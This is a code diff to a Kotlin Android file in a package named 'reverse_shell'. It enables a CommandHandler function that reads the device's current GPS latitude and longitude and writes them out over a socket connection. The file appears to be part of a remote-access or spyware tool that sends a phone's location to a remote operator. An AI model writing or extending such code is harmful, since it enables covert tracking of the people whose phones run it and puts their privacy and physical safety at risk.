@@ -1,6 +1,8 @@
 package com.ironclad.saksham.reverse_shell
 
 import android.content.Context
+import android.os.Build
+import androidx.annotation.RequiresApi
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
 import java.io.OutputStream
@@ -64,18 +66,20 @@ object CommandHandler {
     }
 
 
-//    suspend fun handleCurrentLocation(context: Context, socketOutput: OutputStream, shellOutput: OutputStream)= withContext(Dispatchers.IO){
-//        try {
-//            val latitude = getCurrentLocation(context)?.latitude.toString()
-//            val longitude = getCurrentLocation(context)?.longitude.toString()
-//            socketOutput.write(("Latitude: $latitude\nLongitude: $longitude\n").toByteArray())
-//            socketOutput.flush()
-//            shellOutput.write(("\n").toByteArray())
-//
-//        }
-//        catch (e:Exception){
-//            socketOutput.write(("Error: ${e.message}\n").toByteArray())
-//            socketOutput.flush()
-//        }
-//    }
+    @RequiresApi(Build.VERSION_CODES.P)
+    suspend fun handleCurrentLocation(context: Context, socketOutput: OutputStream, shellOutput: OutputStream)= withContext(Dispatchers.IO){
+        try {
+            val latitude = getCurrentLocation(context).latitude
+            val longitude = getCurrentLocation(context).longitude
+            socketOutput.write(("Latitude: $latitude\nLongitude: $longitude\n").toByteArray())
+            socketOutput.flush()
+            shellOutput.write(("\n").toByteArray())
+
+        }
+        catch (e:Exception){
+            socketOutput.write(("Error: ${e.message}\n").toByteArray())
+            socketOutput.flush()
+            shellOutput.write(("\n").toByteArray())
+        }
+    }
 }
